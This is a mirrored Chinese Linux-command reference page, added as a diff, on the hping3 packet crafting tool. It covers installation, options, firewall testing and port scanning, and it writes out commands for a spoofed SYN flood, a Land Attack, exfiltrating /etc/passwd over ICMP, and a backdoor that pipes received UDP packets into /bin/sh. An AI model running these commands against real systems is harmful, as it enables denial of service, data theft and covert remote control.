@@ -1,0 +1,69 @@
+<!DOCTYPE html><html lang="zh-cn">
+<!-- Mirrored from man.niaoge.com/hping3 by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 10 Jan 2026 15:04:00 GMT -->
+<head>
+<meta charset="UTF-8"/><meta name="renderer" content="webkit"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"/><link href="public/style.css" rel="stylesheet" type="text/css" />
+<link href="public/index.css" rel="stylesheet" type="text/css" />
+<link href="public/img/favicon.ico" type="image/x-icon" rel="shortcut icon">
+<script src="https://apps.bdimg.com/libs/jquery/1.10.2/jquery.min.js"></script><script src="public/main.js"></script><title>hping3命令_Linux hping3 命令用法详解：测试网络及主机的安全</title><link rel="canonical" href="hping3.html"/></head><body><div id="header" class="clearfix"><h2 id="logo" class="left"><a title="Linux命令大全" href="index.html">Linux命令大全</a></h2><ul id="menu-main" class="right toggle-target"><li id="menu-item-4" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-4"><a href="index.html">首页搜索</a></li><li id="menu-item-6" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6"><a href="par/2.html">系统管理</a></li><li id="menu-item-7" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-7"><a href="par/5.html">网络管理</a></li><li id="menu-item-8" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-8"><a href="par/4.html">软件·打印·开发·工具</a></li><li id="menu-item-9" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9"><a href="par/1.html">文件和目录管理</a></li><li id="menu-item-10" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-10"><a href="par/3.html">硬件·内核·Shell·监测</a></li></ul> <span id="menu-main-toggle" class="toggle-btn" toggle-target="#menu-main"></span></div><div id="main-single" class="main-layout clearfix"><div class="right arc-wrap"><div id="position-wrap" class="clearfix"><div class="position left">当前位置：<a href="index.html">首页</a> &raquo; <a href="par/5.html" rel="category tag">网络管理</a> &raquo; hping3</div></div><div id="title" class="clearfix"><h1 class="left">hping3命令</h1><div class="right"> <a href="sub/%e7%bd%91%e7%bb%9c%e6%b5%8b%e8%af%95.html" rel="tag">网络测试</a></div></div><div id="arc-body"><p> <strong>hping</strong>是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p><h3> 安装<br/></h3><pre>
+<span class="wp_keywordlink"><a href="yum.html" title="yum命令" target="_blank">yum</a></span> <span class="wp_keywordlink"><a href="install.html" title="install命令" target="_blank">install</a></span> libpcap-devel tc-devel
+<span class="wp_keywordlink"><a href="ln.html" title="ln命令" target="_blank">ln</a></span> -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h
+<span class="wp_keywordlink"><a href="wget.html" title="wget命令" target="_blank">wget</a></span> http://www.hping.org/hping3-20051105.<span class="wp_keywordlink"><a href="tar.html" title="tar命令" target="_blank">tar</a></span>.gz
+tar zxvf hping3-20051105.tar.gz
+<span class="wp_keywordlink"><a href="cd.html" title="cd命令" target="_blank">cd</a></span> hping3-20051105
+./configure
+<span class="wp_keywordlink"><a href="make.html" title="make命令" target="_blank">make</a></span>
+make install</pre><h3> 选项<br/></h3><pre>
+-H --<span class="wp_keywordlink"><a href="help.html" title="help命令" target="_blank">help</a></span> 显示帮助。
+-v -VERSION 版本信息。
+-c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。
+-i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。
+-n -nmeric 数字输出，象征性输出主机地址。
+-q -quiet 退出。
+-I --interface interface name 无非就是eth0之类的参数。
+-v --verbose 显示很多信息，TCP回应一般如：len=46 <span class="wp_keywordlink"><a href="ip.html" title="ip命令" target="_blank">ip</a></span>=192.168.1.1 flags=RADF <span class="wp_keywordlink"><a href="seq.html" title="seq命令" target="_blank">seq</a></span>=0 ttl=255 <span class="wp_keywordlink"><a href="id.html" title="id命令" target="_blank">id</a></span>=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 <span class="wp_keywordlink"><a href="sum.html" title="sum命令" target="_blank">sum</a></span>=2010 urp=0
+-D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）
+-z --<span class="wp_keywordlink"><a href="bind.html" title="bind命令" target="_blank">bind</a></span> 快捷键的使用。
+-Z --unbind 消除快捷键。
+-O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。
+-1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。
+-2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。
+-9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。
+-a --spoof <span class="wp_keywordlink"><a href="hostname.html" title="hostname命令" target="_blank">hostname</a></span> 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。
+-t --ttl <span class="wp_keywordlink"><a href="time.html" title="time命令" target="_blank">time</a></span> to live 可以指定发出包的TTL值。
+-H --ipproto 在RAW IP模式里选择IP协议。
+-<span class="wp_keywordlink"><a href="w.html" title="w命令" target="_blank">w</a></span> --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。
+-r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。
+-F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的&ldquo;virtual mtu&rdquo;是16字节。
+-x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。
+-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。
+-G --fragoff fragment offset value <span class="wp_keywordlink"><a href="set.html" title="set命令" target="_blank">set</a></span> the fragment offset
+-m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。
+-G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。
+-C --ICMPTYPE <span class="wp_keywordlink"><a href="type.html" title="type命令" target="_blank">type</a></span> 指定ICMP类型，缺省是ICMP <span class="wp_keywordlink"><a href="echo.html" title="echo命令" target="_blank">echo</a></span> REQUEST。
+-K --ICMPCODE CODE 指定ICMP代号，缺省0。
+--icmp-ipver 把IP版本也插入IP头。
+--icmp-iphlen 设置IP头的长度，缺省为5（32字节）。
+--icmp-iplen 设置IP包长度。
+--icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。
+--icmp-ipproto 设置协议的，缺省是TCP。
+-icmp-<span class="wp_keywordlink"><a href="cksum.html" title="cksum命令" target="_blank">cksum</a></span> 设置校验和。
+-icmp-ts <span class="wp_keywordlink"><a href="alias.html" title="alias命令" target="_blank">alias</a></span> for --icmptype 13 (to send ICMP timestamp requests)
+--icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests)
+-s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。
+-p --deskport [+][+]desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。
+--keep 上面说过了。
+-w --win 发的大小和windows一样大，64BYTE。
+-O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4.
+-m --tcpseq 设置TCP序列数。
+-l --tcpck 设置TCP ack。
+-Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。</pre><h3> Hping3功能<br/></h3><p> Hping3主要有以下典型功能应用：</p><h4> &nbsp;防火墙测试<br/></h4><p> 使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href="http://0daysecurity.com/articles/hping3_examples.html" target="_blank">http://0daysecurity.com/articles/hping3_examples.html</a></p><p> 测试防火墙对ICMP包的反应、是否支持<span class="wp_keywordlink"><a href="traceroute.html" title="traceroute命令" target="_blank">traceroute</a></span>、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p><pre>
+hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10</pre><h4> 端口扫描<br/></h4><p> Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p><pre>
+hping3 -I eth0  -S 192.168.10.1 -p 80</pre><p> 其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p><p> hping3支持非常丰富的端口探测方式，<span class="wp_keywordlink"><a href="nmap.html" title="nmap命令" target="_blank">nmap</a></span>拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p><h4> Idle扫描<br/></h4><p> Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p><p> 该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p><h4> 拒绝服务攻击<br/></h4><p> 使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p><pre>
+hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000</pre><p> 其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p><h4> 文件传输<br/></h4><p> Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p><pre>
+hping3 192.168.1.159--listen signature --safe  --icmp</pre><p> 监听ICMP包中的签名，根据签名解析出文件内容。</p><p> 在发送端使用签名打包的ICMP包发送文件：</p><pre>
+hping3 192.168.1.108--icmp ?d 100 --sign signature --<span class="wp_keywordlink"><a href="file.html" title="file命令" target="_blank">file</a></span> /etc/<span class="wp_keywordlink"><a href="passwd.html" title="passwd命令" target="_blank">passwd</a></span></pre><p> 将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p><h4> 木马功能<br/></h4><p> 如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与<span class="wp_keywordlink"><a href="nc_netcat.html" title="netcat命令" target="_blank">netcat</a></span>的后门功能类似。</p><p> 示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p><p> 在木马启动端：</p><pre>
+hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh</pre><p> 在远程控制端：</p><pre>
+echo <span class="wp_keywordlink"><a href="ls.html" title="ls命令" target="_blank">ls</a></span> &gt;<span class="wp_keywordlink"><a href="test.html" title="test命令" target="_blank">test</a></span>.cmd
+hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</pre><p> 将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p><p> 当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p></div></div><div id="sidebar" class="left"><div class="box"><h3 class="title">相关命令</h3><ul class="body list-col-1 clearfix"><li><a href="host.html" title="host">host</a></li><li><a href="ping.html" title="ping">ping</a></li><li><a href="traceroute.html" title="traceroute">traceroute</a></li><li><a href="arping.html" title="arping">arping</a></li><li><a href="netstat.html" title="netstat">netstat</a></li><li><a href="dig.html" title="dig">dig</a></li><li><a href="nslookup.html" title="nslookup">nslookup</a></li><li><a href="tracepath.html" title="tracepath">tracepath</a></li><li><a href="arp.html" title="arp">arp</a></li><li><a href="iperf.html" title="iperf">iperf</a></li><li><a href="nc_netcat.html" title="nc/netcat">nc/netcat</a></li><li><a href="arpwatch.html" title="arpwatch">arpwatch</a></li></ul></div><div id="sidebar_search_box" class="box"><form action="https://man.niaoge.com/" method="post"> <input class="search-input " type="text" name="ss" id="ss" value="命令直达(输入完整命令)" onfocus="if (value =='命令直达(输入完整命令)'){value =''}" onblur="if (value ==''){value='命令直达(输入完整命令)'}"/> <input class="search-submit button mobile-visible" type="submit" value="进入"/></form></div><div class="box"><h3 class="title"><a href="download/index.html">Linux下载</a></h3><ul class="body list-col-1 clearfix"><li><a href="download/Ubuntu.html">Ubuntu下载</a></li><li><a href="download/CentOS.html">CentOS下载</a></li></ul></div></div></div> ﻿<div id="footer-wrap"><div id="btn-backtop" title="返回顶部">返回顶部↑</div><div id="footer"><div class="info box"> <a href="index.html" title="Linux命令大全">Linux命令大全</a> <span class="split"></span> <a href="about_us.html" title="关于/联系">关于/联系</a> <span class="split"></span> 收藏本站请使用Ctrl+D <span class="split"></span> <a href="shell-script/index.html" target="_blank">Shell脚本攻略</a> <span class="split"></span> <a href="shell-regex.html" target="_blank">Shell正则表达式</a> <span class="split"></span> 共收录 <span style="font-size: 16px; color:#74b147;">585</span> 条Linux系统命令</div><div class="desc box">在Linux命令大全（man.niaoge.com）可以查询您所需要的Linux命令教程和相关实例。如果您觉得本站内容对您有所帮助，请推荐给更多需要帮助的人。</div></div></div> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?9afbd88b4e674f3b4af0a760c48a00ac"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script></body>
+<!-- Mirrored from man.niaoge.com/hping3 by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 10 Jan 2026 15:04:02 GMT -->
+</html>
